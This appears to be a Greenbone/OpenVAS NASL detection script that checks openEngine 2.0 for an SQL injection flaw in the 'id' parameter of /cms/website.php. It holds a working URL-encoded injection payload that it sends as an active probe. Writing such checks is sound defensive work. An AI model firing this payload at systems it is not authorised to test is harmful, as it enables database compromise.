CPE = "cpe:/a:openengine:openengine";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103278" );
	script_version( "2021-06-22T11:24:02+0000" );
	script_bugtraq_id( 49794 );
	script_tag( name: "last_modification", value: "2021-06-22 11:24:02 +0000 (Tue, 22 Jun 2021)" );
	script_tag( name: "creation_date", value: "2011-09-28 12:51:43 +0200 (Wed, 28 Sep 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "openEngine 'id' Parameter SQLi Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49794" );
	script_xref( name: "URL", value: "http://www.rul3z.de/advisories/SSCHADV2011-019.txt" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_openengine_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "openengine/detected" );
	script_tag( name: "summary", value: "openEngine is prone to an SQL Injection (SQLi) vulnerability
  because it fails to sufficiently sanitize user-supplied data before using it in an SQL query." );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying database
  implementation." );
	script_tag( name: "affected", value: "openEngine 2.0 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: cpe, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/cms/website.php?id=/de/sendpage.htm%27)%20AND%201=1%20AND%20(%27a%27=%27a&key=";
if(http_vuln_check( port: port, url: url, pattern: "Warning: mysql_num_fields" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

